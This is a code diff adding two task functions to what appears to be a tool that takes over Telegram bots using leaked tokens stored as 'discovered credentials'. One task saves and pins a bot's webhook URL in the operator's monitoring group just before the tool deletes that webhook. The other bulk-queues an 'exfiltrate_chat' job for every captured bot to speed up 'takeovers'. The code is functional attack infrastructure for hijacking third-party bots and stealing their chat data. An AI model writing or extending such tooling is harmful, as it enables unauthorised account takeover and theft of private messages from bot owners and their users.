@@ -1699,6 +1699,197 @@ async def _probe_webhooks_logic(max_per_run: int, force: bool = False) -> dict:
     }
 
 
+@app.task(name="flow.pin_webhook_url")
+def pin_webhook_url(
+    credential_id: str | None = None,
+    webhook_url: str = "",
+    evidence: dict | None = None,
+    bot_token: str | None = None,
+):
+    """Post the captured webhook URL to the credential's topic and pin it.
+
+    Fire-and-forget task dispatched from the scraper right BEFORE we call
+    deleteWebhook — preserves the URL in a visible, pinned location so we
+    still have it after wiping the remote registration.
+
+    Accepts either credential_id (direct) or bot_token (looked up via
+    sha256 hash in discovered_credentials.token_hash).
+    """
+    from app.workers.celery_app import get_worker_loop
+
+    return get_worker_loop().run_until_complete(
+        _pin_webhook_url_logic(credential_id, webhook_url, evidence or {}, bot_token)
+    )
+
+
+async def _pin_webhook_url_logic(
+    credential_id: str | None,
+    webhook_url: str,
+    evidence: dict,
+    bot_token: str | None = None,
+) -> dict:
+    import hashlib
+
+    if not webhook_url:
+        return {"status": "invalid_args", "reason": "webhook_url required"}
+
+    # Resolve credential_id from bot_token if not provided
+    if not credential_id and bot_token:
+        try:
+            token_hash = hashlib.sha256(bot_token.encode()).hexdigest()
+            lookup = await async_execute(
+                db.table("discovered_credentials")
+                .select("id")
+                .eq("token_hash", token_hash)
+                .limit(1)
+            )
+            if lookup.data:
+                credential_id = lookup.data[0]["id"]
+        except Exception as e:
+            return {"status": "token_lookup_failed", "error": str(e)[:200]}
+
+    if not credential_id:
+        return {"status": "no_credential_id"}
+
+    try:
+        row = await async_execute(
+            db.table("discovered_credentials")
+            .select("id, bot_username, bot_id, chat_name, meta")
+            .eq("id", credential_id)
+            .limit(1)
+        )
+    except Exception as e:
+        return {"status": "db_lookup_failed", "error": str(e)[:200]}
+
+    if not row.data:
+        return {"status": "credential_not_found"}
+
+    cred = row.data[0]
+    meta = cred.get("meta") or {}
+    bot_username = cred.get("bot_username")
+    bot_id = cred.get("bot_id")
+    topic_id = meta.get("topic_id")
+
+    # Resolve/create topic if missing
+    broadcaster = get_broadcaster()
+    if not topic_id:
+        if bot_username:
+            topic_name = f"@{bot_username} / {bot_id}"
+        elif bot_id:
+            topic_name = f"@unknown / {bot_id}"
+        else:
+            topic_name = f"Cred-{credential_id[:8]}"
+        try:
+            topic_id = await broadcaster.ensure_topic(settings.MONITOR_GROUP_ID, topic_name)
+            new_meta = {**meta, "topic_id": topic_id}
+            try:
+                await async_execute(
+                    db.table("discovered_credentials")
+                    .update({"meta": new_meta})
+                    .eq("id", credential_id)
+                )
+            except Exception:
+                pass
+        except Exception as topic_exc:
+            return {"status": "topic_create_failed", "error": str(topic_exc)[:200]}
+
+    if not topic_id:
+        return {"status": "no_topic"}
+
+    # Compose the pin — plain text, no Markdown parse (URL may contain unbalanced chars)
+    header = f"🔗 Captured webhook URL (before takeover)"
+    lines = [header, "", webhook_url, ""]
+    if bot_username or bot_id:
+        lines.append(f"Bot: @{bot_username or '?'} ({bot_id or '?'})")
+    for k, v in (evidence or {}).items():
+        if k in ("delete_policy", "webhook_url"):
+            continue
+        if isinstance(v, (str, int, float, bool)) or v is None:
+            lines.append(f"- {k}: {v}")
+    msg = "\n".join(lines)[:3900]
+
+    sent_msg_id = await broadcaster.send_to_thread(
+        settings.MONITOR_GROUP_ID, topic_id, msg, parse_mode=None
+    )
+    if not sent_msg_id:
+        return {"status": "send_failed", "topic_id": topic_id}
+
+    pinned = await broadcaster.pin_message(settings.MONITOR_GROUP_ID, sent_msg_id)
+
+    # Persist the pinned msg id in meta for future reference / cleanup
+    try:
+        from datetime import datetime, timezone
+
+        new_meta = {
+            **meta,
+            "topic_id": topic_id,
+            "pinned_webhook_msg_id": sent_msg_id,
+            "pinned_webhook_at": datetime.now(timezone.utc).isoformat(),
+        }
+        await async_execute(
+            db.table("discovered_credentials")
+            .update({"meta": new_meta})
+            .eq("id", credential_id)
+        )
+    except Exception:
+        pass
+
+    return {
+        "status": "ok",
+        "topic_id": topic_id,
+        "message_id": sent_msg_id,
+        "pinned": pinned,
+    }
+
+
+@app.task(name="flow.force_webhook_takeover_pass")
+def force_webhook_takeover_pass(max_credentials: int = 200):
+    """Queue immediate exfiltrate for every active credential that has a captured
+    webhook_url. Bypasses the rescrape cursor so takeovers happen in seconds.
+    """
+    from app.workers.celery_app import get_worker_loop
+
+    return get_worker_loop().run_until_complete(
+        _force_webhook_takeover_logic(max_credentials)
+    )
+
+
+async def _force_webhook_takeover_logic(max_credentials: int) -> dict:
+    try:
+        res = await async_execute(
+            db.table("discovered_credentials")
+            .select("id, bot_username, bot_id, meta")
+            .eq("status", "active")
+            .order("updated_at", desc=True)
+            .limit(2500)
+        )
+    except Exception as e:
+        return {"status": "db_lookup_failed", "error": str(e)[:200]}
+
+    queued: list[str] = []
+    for row in res.data or []:
+        meta = row.get("meta") or {}
+        if not meta.get("webhook_url"):
+            continue
+        try:
+            app.send_task("flow.exfiltrate_chat", args=[row["id"]], queue="scrape")
+            queued.append(row["id"])
+        except Exception as e:
+            logger.warning(f"[ForceTakeover] enqueue failed for {row['id']}: {e}")
+        if len(queued) >= max_credentials:
+            break
+
+    logger.info(f"[ForceTakeover] enqueued {len(queued)} credentials for immediate rescrape")
+    try:
+        await get_broadcaster().send_log(
+            f"⚡ Force takeover pass — enqueued {len(queued)} webhook-registered bots for immediate rescrape"
+        )
+    except Exception:
+        pass
+
+    return {"status": "ok", "queued": len(queued)}
+
+
 @app.task(name="flow.system_help")
 def system_help():
     """Periodic guide on how to use system commands."""
